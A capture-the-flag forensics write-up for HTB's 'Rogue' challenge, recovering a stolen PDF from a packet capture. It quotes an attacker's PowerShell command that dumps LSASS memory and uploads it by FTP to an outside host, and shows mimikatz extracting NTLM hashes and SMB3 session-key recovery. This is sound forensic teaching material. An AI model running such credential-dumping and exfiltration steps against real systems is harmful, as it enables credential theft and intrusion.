# HTB Business CTF 2022 - Rogue

## Challenge

> SecCorp has reached us about a recent cyber security incident. They are confident that a malicious entity has managed to access a shared folder that stores confidential files. Our threat intel informed us about an active dark web forum where disgruntled employees offer to give access to their employer's internal network for a financial reward. In this forum, one of SecCorp's employees offers to provide access to a low-privileged domain-joined user for 10K in cryptocurrency. Your task is to find out how they managed to gain access to the folder and what corporate secrets did they steal.

- [forensics_rogue.zip](files/forensics_rogue.zip)
  - `capture.pcapng`

### Metadata

- Difficulty: `medium`
- Tags: `pcap`, `wireshark`, `lsass`, `minidump`, `mimikatz`, `smbv3`
- Points: `350`
- Number of solvers: `tbd`

## Solution

### Understanding the capture

If we open the capture in `Wireshark` and open the TCP stream view, we can see that TCP stream 0 contains some PowerShell commands:

```
whoami
ws02\rpaker
PS C:\Windows\system32> hostname
ws02
PS C:\Windows\system32> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
CORP\athomson
CORP\Domain Admins
rpaker
The command completed successfully.

PS C:\Windows\system32> Remove-Item -Path C:\windows\temp\3858793632.pmd -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\3858793632.pmd full | out-host; Compress-Archive  C:\windows\temp\3858793632.pmd  C:\windows\temp\3858793632.zip;Remove-Item -Path C:\windows\temp\3858793632.pmd -Force -ErrorAction Ignore;$cl = New-Object System.Net.WebClient;$f = "C:\windows\temp\3858793632.zip";$s = "ftp://ftpuser:SZC0aBomFG@windowsliveupdater.com/3858793632.zip";$u = New-Object System.Uri($s);$cl.UploadFile($u, $f);Remove-Item -Path C:\windows\temp\3858793632.zip -Force -ErrorAction Ignore;
PS C:\Windows\system32> exit
```

Let's analyze the most interesting part:

```powershell
Remove-Item -Path C:\windows\temp\3858793632.pmd -Force -ErrorAction Ignore;
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\3858793632.pmd full | out-host;
Compress-Archive  C:\windows\temp\3858793632.pmd  C:\windows\temp\3858793632.zip;
Remove-Item -Path C:\windows\temp\3858793632.pmd -Force -ErrorAction Ignore;
$cl = New-Object System.Net.WebClient;
$f = "C:\windows\temp\3858793632.zip";
$s = "ftp://ftpuser:SZC0aBomFG@windowsliveupdater.com/3858793632.zip";
$u = New-Object System.Uri($s);
$cl.UploadFile($u, $f);
Remove-Item -Path C:\windows\temp\3858793632.zip -Force -ErrorAction Ignore;
```

1. The command creates a `minidump` from the `lsass` process using `comsvcs.dll`.
2. It compresses the dump.
3. Uploads the compressed dump to a remote FTP server.
4. Deletes the evidences.

From the words `lsass` and `dump` one might immediately think about `mimikatz` and password hashes. Let's save this idea for later.

TCP stream 4 contains the FTP communication:

```
220 (vsFTPd 3.0.3)
USER ftpuser
331 Please specify the password.
PASS SZC0aBomFG
230 Login successful.
OPTS utf8 on
200 Always in UTF8 mode.
PWD
257 "/" is the current directory
TYPE I
200 Switching to Binary mode.
PASV
227 Entering Passive Mode (77,74,198,52,226,112).
STOR 3858793632.zip
150 Ok to send data.
226 Transfer complete.
```

And TCP stream 5 contains the transferred [`3858793632.zip`](files/3858793632.zip) which we can copy from `Wireshark` as a hex stream and convert it to binary with `Python` or `xxd -r -p`.

```
$ ls -la
.rw-r--r-- manjaro manjaro 21 MB Fri Jul 15 19:22:03 2022  3858793632.zip
$ unzip 3858793632.zip
$ ls -la 3858793632.pmd 
.rw-r--r-- manjaro manjaro 55 MB Mon Jul  4 04:39:18 2022  3858793632.pmd
```

### What is the mission?

The challenge description says:

> They are confident that a malicious entity has managed to access a shared folder that stores confidential files.

and

> Your task is to find out how they managed to gain access to the folder and what corporate secrets did they steal.

These suggest that we should look for some SMB communication in the capture.

In TCP stream 50 we can see the following SMB communication:

![SMB authentication Wireshark](pictures/smb-auth-wireshark.png)

![SMB ConfidentialShare Wireshark](pictures/smb-file-wireshark.png)

We can see that the `CORP\athomason` account did something with the `\CORP-DC\ConfidentialShare`, unfortunately, all following communication is SMBv3, hence encrypted.

### SMBv3 and Wireshark

We can start searching for *"decrypting SMB communication with Wireshark"*.

If we are lucky enough we can find the following CTF write-up on Medium by Khris Tolbert:

- *Decrypting SMB3 Traffic with just a PCAP? Absolutely (maybe.)*: <https://medium.com/maverislabs/decrypting-smb3-traffic-with-just-a-pcap-absolutely-maybe-712ed23ff6a2>

I don't want to copy paste the content of this write-up, you might want to read it yourself. The most important thing is that we can decrypt the SMBv3 session with Wireshark if we have the following parameters:
- The user's password or `NTLMv2 hash`
- `Username` and `Domain` (present in the capture)
- `ResponseKeyNT` calculated from the `NTLMv2 hash`, the `Username` and the `Domain`
- `NTProofStr` (can be calculated but it is present in the capture)
- `KeyExchangeKey` calculated from `ResponseKeyNT` and `NTProofStr`

Then we can decrypt the `Encrypted Session Key` (present in the capture) using the `KeyExchangeKey` to finally get the `Random Session Key` which can be put into Wireshark.

We can see that we only need the `NTLMv2 hash` of the user, everything else is either in the capture or can be calculated from the other values.

### NTLMv2 hash

Now we can use `Mimikatz`, or can we?

Yes we can: [using Mimikatz to get cleartext password from offline memory dump](https://abawazeeer.medium.com/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330)

Let's do it:

![Mimikatz](pictures/mimikatz.png)

```
PS Z:\ActiveDirectory\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #

mimikatz # sekurlsa::minidump 3858793632.pmd
Switch to MINIDUMP : '3858793632.pmd'

mimikatz # sekurlsa::logonPasswords full
Opening : '3858793632.pmd' file for minidump...
[...]
Authentication Id : 0 ; 3857660 (00000000:003adcfc)
Session           : RemoteInteractive from 2
User Name         : athomson
Domain            : CORP
Logon Server      : CORP-DC
Logon Time        : 7/4/2022 1:32:10 PM
SID               : S-1-5-21-288640240-4143160774-4193478011-1110
        msv :
         [00000003] Primary
         * Username : athomson
         * Domain   : CORP
         * NTLM     : 88d84bad705f61fcdea0d771301c3a7d
         * SHA1     : 60570041018a9e38fbee99a3e1f7bc18712018ba
         * DPAPI    : 022e4b6c4a40b4343b8371abbfa9a1a0
        tspkg :
        wdigest :
         * Username : athomson
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : athomson
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO
[...]
```

We have the `NTLMv2 hash` of `athomson`: `88d84bad705f61fcdea0d771301c3a7d`

### Decrypting SMBv3

To summarize:
- `NTLMv2 hash`: `88d84bad705f61fcdea0d771301c3a7d`
- `Username`: `athomson`
- `Domain`: `corp`
- `NTProofStr`: TODO
- `Encrypted Session Key`: TODO

The `NTProofStr` can be found in Wireshark:

1. Select the `Session Setup Request, NTLMSSP_AUTH`
2. Navigate to `SMB2` -> `Session Setup Request` -> `Security Blob` -> ... -> `negTokenTarg` -> `NTLM Secure Service Provider` -> `NTLM Response` -> `NTLMv2 Response` -> `NTProofStr`: `d047ccdffaeafb22f222e15e719a34d4`

![NTProofStr](pictures/ntproofstr.png)

The `Encrypted Session Key` can also be found in Wireshark:

1. Select the `Session Setup Request, NTLMSSP_AUTH`
2. Navigate to `SMB2` -> `Session Setup Request` -> `Security Blob` -> ... -> `negTokenTarg` -> `NTLM Secure Service Provider` -> `Session Key`: `032c9ca4f6908be613b240062936e2d2`

![Encrypted Session Key](pictures/encrypted-session-key.png)

Then, we should rewrite the example script from Khris Tolbert to Python3, which I've already did: [smb-session-key.py](files/smb-session-key.py)

```bash
$ python smb-session-key.py --user athomson --domain corp --hash 88d84bad705f61fcdea0d771301c3a7d --ntproofstr d047ccdffaeafb22f222e15e719a34d4 --key 032c9ca4f6908be613b240062936e2d2 -v
User+Domain:            ATHOMSONCORP
NTLMv2 hash:            88d84bad705f61fcdea0d771301c3a7d
ResponseKeyNT:          6bc1c5e3a6a4aba16139faad9a3cce6e
NTProofStr:             d047ccdffaeafb22f222e15e719a34d4
KeyExchangeKey:         4765b4b66d2d5de5b323708a33d33318
EncryptedSessionKey:    032c9ca4f6908be613b240062936e2d2
Random SK:              9ae0af5c19ba0de2ddbe70881d4263ac
```

The `Session Key` we need for decryption is `9ae0af5c19ba0de2ddbe70881d4263ac`.

Now, navigate to `Edit -> Preferences -> Protocols -> SMB2 -> Secret Session Keys for decryption -> Edit`.

There we can see, that we need a `Session Id`. The `Session Id` can be found in the `SMB2 header` field in a packet.

![SMB Session Id](pictures/session-id.png)

It is important to mention that you have to copy it as a hex stream, the Session Id is `1500000000a00000` and not `0000a00000000015`.

Now we should be able to decrypt the session.

![SMB decryption](pictures/smb-decryption.png)

Encrypted:

![Encrypted SMB](pictures/encrypted-smb.png)

Decrypted:

![Decrypted SMB](pictures/decrypted-smb.png)

It seems successful. If we go to `File -> Export Objects -> SMB`, we can see the `customer_information.pdf`.

![Export SMB](pictures/export-smb.png)

If we export and open the PDF ([customer_information.pdf](files/customer_information.pdf)), we can see the flag.

![customer_information](pictures/customer-information.png)

Flag: `HTB{n0th1ng_c4n_st4y_un3ncrypt3d_f0r3v3r}`

## Review

If we didn't find the write-up about SMB decryption, I think we would have been stuck with that for hours. I love forensics challenges, especially because during the CTF you usually don't realize or pay attention to the small details of the challenge like how the attack happened, or what exact commands were used. For example, in this case, during the CTF, I didn't care about how the minidump was created, I only cared about, that it should contain the NTLMv2 hash and that's it. But while I was writing this write-up, I learned about memory dumping with `comsvcs.dll`. Thanks HTB! <3

## Files

- [forensics_rogue.zip](files/forensics_rogue.zip): Challenge files
  - `capture.pcapng`
- [3858793632.zip](files/3858793632.zip): Compressed minidump from LSASS
- [smb-session-key.py](files/smb-session-key.py): SMB session key decryptor
- [customer_information.pdf](files/customer_information.pdf): The decrypted PDF file from SMB